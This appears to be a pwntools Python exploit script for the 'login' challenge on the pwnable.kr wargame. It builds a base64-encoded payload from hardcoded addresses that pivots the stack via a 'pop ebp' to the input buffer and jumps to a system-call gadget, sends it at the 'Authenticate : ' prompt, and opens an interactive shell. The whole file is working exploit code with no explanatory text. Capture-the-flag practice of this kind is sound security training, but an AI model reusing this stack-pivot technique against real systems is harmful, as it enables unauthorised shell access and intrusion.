from pwn import *
import base64 as bs

context(os="linux", arch="i386")

context.log_level = "debug"

addr_sys = 0x8049284 
# addr_ret = 0x0804812f # no need
addr_input = 0x0811EB40

payload = flat([
    # addr_ret,
    addr_sys,
    0xdeadbeef,
    addr_input - 4 # -4 is for the 'pop ebp'
])

if (args.LOCAL):
    io = process("./login")
else:
    io = remote("pwnable.kr", 9003)

final_payload = bs.b64encode(payload)
io.sendlineafter(b"Authenticate : ", final_payload)
io.interactive()